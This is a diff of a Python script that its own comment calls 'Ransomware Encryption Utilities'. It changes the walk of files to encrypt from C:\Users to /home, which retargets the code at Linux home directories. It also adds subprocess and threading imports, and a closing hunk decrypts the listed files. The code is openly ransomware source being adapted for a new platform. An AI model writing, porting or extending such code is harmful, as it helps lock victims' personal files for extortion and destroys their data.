@@ -1,22 +1,15 @@
-# For AES Encryption
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
-
-# For RSA Encryption
+from tkinter import messagebox
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend
-
-# For MessageBoxes
-import tkinter as tk
-from tkinter import messagebox
-
-# Misc
+import subprocess
 import requests
 import os
-
+import threading
 
 # Ransomware Encryption Utilities
 def encrypt_file(file_path, out_file_path, key):
@@ -77,7 +70,7 @@ file_paths = []
 
 # Get list of paths to files to encrypt starting from Users folder
 def load_file_paths():
-    for root, dirs, files in os.walk("C:\\Users"):
+    for root, dirs, files in os.walk("/home"):
         for name in files:
             path = os.path.join(root, name)
             global file_paths
@@ -210,4 +203,5 @@ with open('./encrypted_files.txt', 'r') as files:
         d_line = line.strip()
         print(d_line)
         decrypt_file(d_line, d_line, decrypted_aes)
+
 
